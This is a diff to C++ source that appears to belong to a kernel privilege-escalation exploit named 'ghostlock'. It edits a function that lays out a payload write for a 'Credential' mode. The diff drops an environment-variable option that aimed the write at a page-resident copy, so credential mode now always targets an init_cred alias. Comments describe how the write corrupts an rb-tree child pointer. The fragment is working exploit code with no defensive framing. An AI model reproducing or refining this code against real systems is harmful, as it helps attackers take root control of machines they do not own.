@@ -58,11 +58,6 @@ bool encode_multicast_waiter(std::span<std::byte> buffer,
 
 }  // namespace ghostlock
 
-bool credential_install_from_copy() noexcept {
-    const char *e = getenv("GHOSTLOCK_CRED_FROM_COPY");
-    return e && *e == '1';
-}
-
 PayloadWriteLayout payload_write_layout(
         const WriteRequest *request, uintptr_t page_base,
         uintptr_t default_fops, uintptr_t credential_fops,
@@ -80,17 +75,10 @@ PayloadWriteLayout payload_write_layout(
         const char *word = getenv("GHOSTLOCK_WRITE_WORD");
         if (word && *word) {
             layout.right = (uintptr_t) strtoull(word, nullptr, 0);
-        } else if (request->mode == WriteMode::Credential) {
-            /* See credential_install_from_copy(): the stored word doubles as the
-             * rb-tree child pointer, so the collateral store lands inside
-             * whatever it points at.  The page-resident copy keeps that damage
-             * off init_cred.  Fall back to the global when no copy address was
-             * threaded through (or the copy is switched off). */
-            layout.right = (credential_install_from_copy() && credential_fops)
-                    ? credential_fops
-                    : init_cred_alias;
         } else {
-            layout.right = page_base + 0x100;
+            layout.right = request->mode == WriteMode::Credential
+                    ? init_cred_alias
+                    : page_base + 0x100;
         }
     }
     if (request->mode == WriteMode::Credential) {
